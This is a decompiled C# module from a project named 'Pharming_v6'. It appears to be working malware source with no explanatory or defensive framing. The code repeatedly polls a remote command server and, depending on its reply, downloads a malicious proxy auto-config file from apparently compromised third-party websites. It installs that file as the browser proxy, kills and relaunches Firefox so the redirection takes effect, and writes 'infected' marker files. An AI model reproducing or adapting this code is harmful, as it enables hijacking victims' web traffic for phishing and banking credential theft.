using System;
using System.IO;
using System.Net;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Pharming_v6;

[StandardModule]
internal sealed class atproxy1
{
	public static string pac;

	public static void atproxy1()
	{
		while (true)
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://nigel-payne.co.uk/includes/check.php");
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			string text = streamReader.ReadToEnd();
			if (!((Operators.CompareString(text, "avnao", false) == 0) & !File.Exists(Module1.temp + "nuncafoiav.txt")))
			{
				if ((Operators.CompareString(text, "avsim", false) == 0) & !File.Exists(Module1.temp + "nuncafoiav.txt"))
				{
					string path = Module1.temp + "nuncafoiav.txt";
					FileStream fileStream = null;
					try
					{
						if (!File.Exists(path))
						{
							fileStream = File.Create(path);
							using (fileStream)
							{
							}
							using StreamWriter streamWriter = new StreamWriter(path);
							streamWriter.Write("infected");
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					string address = "http://photothequegaud.com/CATHEDRALES%20et%20AUTRES%20EGLISES/Autres%20eglises/41-SUISSE/41-GENE%20-%20Geneve%20-Auditoire%20Jean%20Calvin%20VIT/bu.jsp";
					try
					{
						WebClient webClient = new WebClient();
						webClient.DownloadFile(address, Module1.temp + "pacnet.jsp");
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					string b = "file://" + Module1.temp + "pacnet.jsp";
					Module1.a(b);
					killff.killff();
					firefox.firefox();
					Thread.Sleep(1000000);
				}
				else if ((Operators.CompareString(text, "avnao", false) == 0) & File.Exists(Module1.temp + "nuncafoiav.txt"))
				{
					File.Delete(Module1.temp + "temporaryfile.jsp");
					File.Move(Module1.temp + "pacnet.jsp", Module1.temp + "temporaryfile.jsp");
					File.Delete(Module1.temp + "nuncafoiav.txt");
					string path2 = Module1.temp + "txtmodificado.txt";
					FileStream fileStream3 = null;
					try
					{
						if (!File.Exists(path2))
						{
							fileStream3 = File.Create(path2);
							using (fileStream3)
							{
							}
							using StreamWriter streamWriter2 = new StreamWriter(path2);
							streamWriter2.Write("infected");
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					firefox.firefox();
					Thread.Sleep(1000000);
				}
				else if ((Operators.CompareString(text, "avsim", false) == 0) & File.Exists(Module1.temp + "nuncafoiav.txt"))
				{
					string address2 = "http://www.interpraevent.at/tools/bu.jsp";
					try
					{
						WebClient webClient2 = new WebClient();
						webClient2.DownloadFile(address2, Module1.temp + "pacnet.jsp");
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					string b2 = "file://" + Module1.temp + "pacnet.jsp";
					Module1.a(b2);
					killff.killff();
					firefox.firefox();
					Thread.Sleep(1000000);
				}
			}
			else if (!File.Exists(Module1.temp + "txtmodificado.txt"))
			{
				writepac.writepac();
				pac = "file://" + Module1.temp + "temporaryfile.jsp";
				Module1.a(pac);
				killff.killff();
				firefox.firefox();
				Thread.Sleep(1000000);
			}
			else
			{
				pac = "file://" + Module1.temp + "temporaryfile.jsp";
				Module1.a(pac);
				killff.killff();
				firefox.firefox();
				Thread.Sleep(1000000);
			}
		}
	}
}
